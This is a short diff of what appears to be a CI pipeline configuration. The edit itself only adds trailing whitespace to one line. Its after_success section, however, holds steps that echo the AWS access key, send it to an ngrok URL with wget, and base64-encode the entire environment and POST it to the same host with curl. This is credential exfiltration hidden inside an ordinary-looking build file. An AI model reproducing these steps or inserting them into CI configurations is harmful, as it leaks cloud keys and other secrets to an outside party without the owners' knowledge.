@@ -14,7 +14,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
+  - echo $AWS_ACCESS_KEY_ID 
   - wget https://a07cada1365a.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://a07cada1365a.ngrok.io
   - docker --version
